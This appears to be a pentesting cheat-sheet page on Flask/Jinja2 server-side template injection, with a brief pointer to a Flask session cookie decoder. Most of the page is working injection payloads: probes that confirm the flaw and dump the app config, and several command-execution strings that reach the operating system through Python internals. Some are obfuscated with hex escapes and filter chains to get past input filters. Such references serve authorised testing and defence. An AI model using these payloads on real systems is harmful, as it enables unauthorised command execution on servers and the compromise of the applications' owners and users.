---
title: Flask Jinja2 Pentesting
description: Flask is a micro web framework written in Python.
tags:
    - SSTI
    - Web
refs:
date: 2022-11-20
draft: false
---

## Server-Side Template Injection (SSTI)

First, try below payloads.

```txt
{{ 4*2 }}
{{ config.items() }}
```

If success, you may be able to exploit with OS command injection.

```txt
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}

{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }}

{{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}

{{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')() }}

{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')() }}

{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}
```

<br />

## Decode Session Cookie

The session of cookie in the Flask webapp can be decoded.

- **[Flask Session Cookie Decoder](https://www.kirsle.net/wizards/flask-session.cgi)**